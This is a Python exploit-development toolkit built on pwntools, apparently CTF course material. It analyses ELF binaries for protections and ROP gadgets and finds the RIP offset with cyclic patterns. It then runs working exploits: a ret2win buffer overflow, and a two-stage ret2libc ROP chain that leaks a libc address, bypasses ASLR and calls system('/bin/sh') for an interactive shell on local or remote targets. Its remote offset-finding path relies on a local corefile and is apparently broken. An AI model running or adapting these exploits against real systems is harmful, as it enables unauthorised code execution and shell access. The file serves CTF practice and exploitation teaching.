"""
CTF Toolkit — pwntools, GDB, Ghidra
Phase 12 — Cryptography & Security

A complete CTF exploit development toolkit supporting:
  - Binary analysis (security properties, symbols, gadgets)
  - RIP offset finding via cyclic patterns
  - ret2win exploitation (buffer overflow to win function)
  - ROP chain exploitation (ret2libc with ASLR bypass)
  - Remote challenge interaction
"""

import sys
import argparse
from pwn import *

context.log_level = 'info'
context.terminal = ['tmux', 'splitw', '-h']  # Adjust for your terminal


def analyze_binary(path):
    """Load binary and print security properties, symbols, PLT, GOT, gadgets."""
    elf = ELF(path)
    print(f"{'=' * 60}")
    print(f"  Binary: {path}")
    print(f"{'=' * 60}")
    print(f"  Arch:         {elf.arch}")
    print(f"  Bits:         {elf.bits}")
    print(f"  Endian:       {elf.endian}")
    print(f"  Canary:       {elf.canary}")
    print(f"  NX:           {elf.nx}")
    print(f"  PIE:          {elf.pie}")
    print(f"  RELRO:        {elf.relro}")
    print(f"  RWX segments: {elf.rwx}")
    print()

    print(f"  Symbols ({len(elf.symbols)}):")
    interesting = ['main', 'win', 'flag', 'system', 'execve', 'read',
                   'write', 'puts', 'printf', 'gets', 'scanf', 'vuln']
    for name in interesting:
        if name in elf.symbols:
            print(f"    {name:20} {hex(elf.symbols[name])}")

    print(f"\n  PLT entries ({len(elf.plt)}):")
    for name, addr in sorted(elf.plt.items()):
        print(f"    {name:20} {hex(addr)}")

    print(f"\n  GOT entries ({len(elf.got)}):")
    for name, addr in sorted(elf.got.items()):
        print(f"    {name:20} {hex(addr)}")

    print(f"\n  Useful ROP gadgets:")
    for pattern, name in [
        (asm("pop rdi; ret"), "pop rdi; ret"),
        (asm("pop rsi; ret"), "pop rsi; ret"),
        (asm("pop rdx; ret"), "pop rdx; ret"),
        (asm("pop rax; ret"), "pop rax; ret"),
        (asm("pop rcx; ret"), "pop rcx; ret"),
        (asm("pop rsp; ret"), "pop rsp; ret"),
        (asm("ret"), "ret"),
        (asm("syscall"), "syscall"),
        (asm("int 0x80"), "int 0x80"),
    ]:
        try:
            gadg = list(elf.search(pattern))
            if gadg:
                print(f"    {name:20} {hex(gadg[0])} ({len(gadg)} found)")
        except Exception:
            pass

    print()
    return elf


def find_rip_offset(binary, local=True, host=None, port=None):
    """Use cyclic pattern to find the exact RIP overwrite offset."""
    log.info("Finding RIP offset with cyclic pattern...")
    io = process(binary) if local else remote(host, port)
    payload = cyclic(500, n=8)
    io.sendline(payload)
    io.wait()

    try:
        core = io.corefile
        if hasattr(core, 'fault_addr') and core.fault_addr is not None:
            fault = core.fault_addr
        elif hasattr(core, 'registers') and 'rip' in core.registers:
            fault = core.registers['rip']
        else:
            log.error("Could not determine fault address from corefile")
            return None
    except FileNotFoundError:
        log.error("Corefile not found; ensure core dumps are enabled")
        log.info("Run: ulimit -c unlimited")
        return None

    offset = cyclic_find(pack(fault, 'all')) if isinstance(fault, int) \
             else cyclic_find(fault)

    if offset is None:
        log.error(f"Could not find offset for fault address {hex(fault)}")
        return None

    log.success(f"Fault address: {hex(fault)}")
    log.success(f"RIP offset: {offset}")
    return offset


def ret2win_exploit(binary, local=True, host=None, port=None):
    """Basic buffer overflow payload that redirects to a win function."""
    elf = ELF(binary)

    if 'win' not in elf.symbols:
        log.warning("No 'win' symbol found. Checking for 'flag' or 'shell'...")
        target = None
        for name in ['win', 'flag', 'shell', 'get_flag', 'print_flag']:
            if name in elf.symbols:
                target = name
                break
        if target is None:
            log.error("No suitable target function found in binary")
            log.info("Available symbols: " +
                     ", ".join(sorted(elf.symbols.keys())))
            return
        win_addr = elf.symbols[target]
        log.info(f"Using symbol '{target}' instead of 'win'")
    else:
        win_addr = elf.symbols['win']

    offset = find_rip_offset(binary, local, host, port)
    if offset is None:
        return

    payload = flat({offset: p64(win_addr)})

    log.info(f"Target function address: {hex(win_addr)}")
    log.info(f"Payload size: {len(payload)} bytes")
    log.info("Sending payload...")

    io = process(binary) if local else remote(host, port)
    io.sendline(payload)
    io.interactive()


def ret2win_exploit_with_gdb(binary):
    """ret2win with GDB attached for debugging."""
    elf = ELF(binary)
    win_addr = elf.symbols.get('win', elf.symbols.get('flag', None))
    if win_addr is None:
        log.error("No win/flag symbol")
        return

    offset = find_rip_offset(binary)

    payload = flat({offset: p64(win_addr)})

    io = process(binary)
    gdb.attach(io, gdbscript=f"""
        set disassembly-flavor intel
        break *{hex(win_addr)}
        continue
    """)
    io.sendline(payload)
    io.interactive()


def ret2libc_stage1(elf, io, offset):
    """Stage 1 of ret2libc: leak puts@GOT and return to main."""
    pop_rdi = next(elf.search(asm("pop rdi; ret")))
    ret = next(elf.search(asm("ret")))

    rop = ROP(elf)
    rop.call('puts', [elf.got['puts']])
    rop.call('main')
    rop_chain = rop.chain()

    payload = flat({offset: [ret, rop_chain]})

    io.sendlineafter(b'>', b'')  # Adjust prompt string as needed
    io.sendline(payload)

    leaked = io.recvline().strip()
    if len(leaked) < 6:
        log.warning(f"Short leak received: {leaked.hex()}")
        leaked = io.recvline().strip()

    leaked_addr = u64(leaked.ljust(8, b"\x00"))
    log.success(f"Leaked puts@GOT: {hex(leaked_addr)}")
    return leaked_addr


def ret2libc_stage2(elf, libc, offset, leaked_puts):
    """Stage 2: compute libc base and call system('/bin/sh')."""
    libc.address = leaked_puts - libc.symbols['puts']
    log.success(f"Libc base: {hex(libc.address)}")

    binsh = next(libc.search(b"/bin/sh"))
    system = libc.symbols['system']
    pop_rdi = next(elf.search(asm("pop rdi; ret")))
    ret = next(elf.search(asm("ret")))

    log.info(f"system@libc:  {hex(system)}")
    log.info(f"/bin/sh@libc: {hex(binsh)}")

    payload = flat({
        offset: [
            ret,
            pop_rdi,
            binsh,
            system,
        ]
    })
    return payload


def rop_exploit(binary, libc_path=None, local=True, host=None, port=None,
                use_one_gadget=False):
    """
    Full ret2libc ROP chain exploit.
    Stage 1: Leak puts@GOT address, return to main.
    Stage 2: Call system('/bin/sh') using computed libc base.
    """
    elf = ELF(binary)

    if 'puts' not in elf.plt:
        log.error("Binary has no puts in PLT; cannot perform ret2libc")
        return

    offset = find_rip_offset(binary, local, host, port)
    if offset is None:
        return

    io = process(binary) if local else remote(host, port)

    try:
        leaked_puts = ret2libc_stage1(elf, io, offset)
    except EOFError:
        log.error("Connection closed during stage 1; wrong prompt/offset?")
        io.close()
        return

    if libc_path:
        libc = ELF(libc_path)
    else:
        log.info("No libc path provided; attempting to use local libc")
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

    try:
        payload2 = ret2libc_stage2(elf, libc, offset, leaked_puts)
    except StopIteration:
        log.error("Could not find /bin/sh in libc or pop rdi; ret gadget")
        io.close()
        return

    io.sendline(payload2)
    io.interactive()


def remote_exploit(binary, host, port, technique='ret2win', libc_path=None):
    """Run exploit against a remote CTF challenge."""
    log.info(f"Connecting to {host}:{port}")
    log.info(f"Binary: {binary}")
    log.info(f"Technique: {technique}")

    if technique == 'ret2win':
        ret2win_exploit(binary, local=False, host=host, port=port)
    elif technique == 'rop':
        rop_exploit(binary, libc_path=libc_path, local=False,
                    host=host, port=port)
    else:
        log.error(f"Unknown technique: {technique}")


def interactive_shell(binary, local=True, host=None, port=None):
    """Just connect and drop into interactive mode (useful after exploit)."""
    io = process(binary) if local else remote(host, port)
    io.interactive()


def main():
    parser = argparse.ArgumentParser(
        description="CTF Exploit Development Toolkit",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s analyze ./vuln              # Analyze binary
  %(prog)s offset ./vuln               # Find RIP offset
  %(prog)s ret2win ./vuln              # ret2win exploit (local)
  %(prog)s rop ./vuln --libc ./libc.so.6  # ret2libc exploit (local)
  %(prog)s remote ./vuln --host 10.0.0.2 --port 1337  # Remote exploit
        """
    )

    parser.add_argument('command',
                        choices=['analyze', 'offset', 'ret2win',
                                 'rop', 'remote', 'interactive'],
                        help="Toolkit command to execute")
    parser.add_argument('binary',
                        help="Path to the target ELF binary")
    parser.add_argument('--host',
                        help="Remote host (for remote exploits)")
    parser.add_argument('--port', type=int,
                        help="Remote port (for remote exploits)")
    parser.add_argument('--libc',
                        help="Path to libc shared object (for ret2libc)")
    parser.add_argument('--technique',
                        choices=['ret2win', 'rop'], default='ret2win',
                        help="Exploit technique for remote mode")
    parser.add_argument('--gdb', action='store_true',
                        help="Attach GDB to the process")

    args = parser.parse_args()

    if args.command == 'analyze':
        analyze_binary(args.binary)

    elif args.command == 'offset':
        if args.host and args.port:
            find_rip_offset(args.binary, local=False,
                            host=args.host, port=args.port)
        else:
            find_rip_offset(args.binary)

    elif args.command == 'ret2win':
        if args.gdb:
            ret2win_exploit_with_gdb(args.binary)
        elif args.host and args.port:
            ret2win_exploit(args.binary, local=False,
                            host=args.host, port=args.port)
        else:
            ret2win_exploit(args.binary)

    elif args.command == 'rop':
        if args.host and args.port:
            rop_exploit(args.binary, libc_path=args.libc,
                        local=False, host=args.host, port=args.port)
        else:
            rop_exploit(args.binary, libc_path=args.libc)

    elif args.command == 'remote':
        if not args.host or not args.port:
            log.error("remote mode requires --host and --port")
            sys.exit(1)
        remote_exploit(args.binary, args.host, args.port,
                       technique=args.technique, libc_path=args.libc)

    elif args.command == 'interactive':
        if args.host and args.port:
            interactive_shell(args.binary, local=False,
                              host=args.host, port=args.port)
        else:
            interactive_shell(args.binary)


if __name__ == "__main__":
    main()
